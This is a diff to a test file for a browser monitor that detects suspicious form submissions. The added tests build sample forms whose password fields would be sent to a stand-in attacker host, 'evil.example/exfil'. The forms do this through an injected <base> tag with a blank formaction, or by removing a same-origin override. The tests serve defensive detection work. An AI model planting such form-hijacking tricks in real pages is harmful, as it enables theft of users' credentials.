@@ -28,6 +28,7 @@ beforeEach(() => {
   testBeacon.mockClear();
   _resetState();
   document.body.innerHTML = "";
+  document.head.querySelectorAll("base").forEach((base) => base.remove());
 });
 
 describe("submitter action baselines", () => {
@@ -76,6 +77,62 @@ describe("submitter action baselines", () => {
       "ns-js-form-submit-suspicious",
       expect.objectContaining({
         actionDynamicallyChanged: true,
+        destinationOrigin: "https://evil.example",
+      })
+    );
+  });
+
+  it("resolves a whitespace-only submitter action against the document base", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    const base = document.createElement("base");
+    base.href = "https://evil.example/base/";
+    document.head.appendChild(base);
+    document.body.innerHTML = `
+      <form action="/safe-endpoint">
+        <input type="password" value="not-observed">
+        <button type="submit" formaction="   ">Continue</button>
+      </form>
+    `;
+    const form = document.querySelector("form") as HTMLFormElement;
+    const button = document.querySelector("button") as HTMLButtonElement;
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+    form.dispatchEvent(
+      new SubmitEvent("submit", { bubbles: true, submitter: button })
+    );
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        actionDynamicallyChanged: false,
+        hasCredentialFields: true,
+        isCrossOrigin: true,
+        destinationOrigin: "https://evil.example",
+      })
+    );
+  });
+
+  it("flags removal of a same-origin override that exposes a cross-origin form action", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    document.body.innerHTML = `
+      <form action="https://evil.example/exfil">
+        <button type="submit" formaction="/safe-endpoint">Continue</button>
+      </form>
+    `;
+    const form = document.querySelector("form") as HTMLFormElement;
+    const button = document.querySelector("button") as HTMLButtonElement;
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+    button.removeAttribute("formaction");
+    form.dispatchEvent(
+      new SubmitEvent("submit", { bubbles: true, submitter: button })
+    );
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        actionDynamicallyChanged: true,
+        isCrossOrigin: true,
         destinationOrigin: "https://evil.example",
       })
     );
